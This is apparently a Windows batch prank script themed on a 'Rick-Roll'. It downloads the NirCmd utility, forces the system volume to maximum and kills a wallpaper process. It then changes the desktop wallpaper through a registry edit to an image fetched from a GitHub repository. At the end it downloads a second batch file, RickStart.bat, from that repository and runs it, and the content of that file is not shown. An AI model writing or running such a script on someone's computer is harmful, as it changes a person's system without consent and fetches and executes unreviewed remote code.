curl https://www.nirsoft.net/utils/nircmd-x64.zip -O
powershell Expand-Archive -Force nircmd-x64.zip C:\Users\%username%\Downloads\

C:\Users\%username%\Downloads\nircmd.exe setsysvolume 65535

taskkill /F /IM "wallpaper32.exe" /T
curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/maxresdefault.jpg -O maxresdefault.jpg
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%username%\Downloads\maxresdefault.jpg /f
C:\Windows\System32\rundll32.exe C:\Windows\System32\user32.dll, UpdatePerUserSystemParameters

pause

curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/RickStart.bat -O RickStart.bat
start RickStart.bat